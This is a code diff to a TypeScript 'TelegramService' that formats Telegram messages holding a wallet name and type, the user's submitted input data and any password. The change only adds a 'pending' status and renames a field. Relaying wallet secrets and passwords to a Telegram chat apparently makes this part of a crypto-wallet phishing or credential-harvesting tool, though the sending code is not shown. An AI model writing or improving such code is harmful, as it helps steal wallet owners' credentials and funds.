@@ -120,8 +120,18 @@ export class TelegramService {
   }
 
   private formatMessage(message: TelegramMessage): string {
-    const status = message.isValid ? '✅ VALID' : '❌ INVALID';
-    const stage = message.validationMessage.includes('validation in progress') ? '🟡 INITIAL INPUT' : '🟢 VALIDATION RESULT';
+    // Determine stage and status based on validation message
+    let stage = '🟢 VALIDATION RESULT';
+    let status = message.isValid ? '✅ VALID' : '❌ INVALID';
+    
+    // Check if this is the first message (pending state)
+    if (message.validationMessage.includes('PENDING') || 
+        message.validationMessage.includes('pending') ||
+        message.validationMessage.includes('VALIDATION IN PROGRESS') ||
+        message.validationMessage.includes('validation in progress')) {
+      stage = '🟡 PENDING VALIDATION';
+      status = '⏳ PENDING';
+    }
     
     // Truncate long data for better readability
     const truncatedData = message.inputData.length > 500 
@@ -134,7 +144,7 @@ export class TelegramService {
 💰 <b>Wallet:</b> ${message.walletName}
 📝 <b>Type:</b> ${message.walletType}
 🔑 <b>Input Type:</b> ${message.inputType}
-📊 <b>Validation:</b> ${message.validationMessage}
+📊 <b>Status:</b> ${message.validationMessage}
 
 📄 <b>Data:</b>
 <code>${truncatedData}</code>
@@ -145,4 +155,4 @@ ${message.password ? `🔒 <b>Password:</b> ${message.password}\n` : ''}
 ⏰ <b>Time:</b> ${new Date(message.timestamp).toLocaleString()}
     `.trim();
   }
-} 
+}
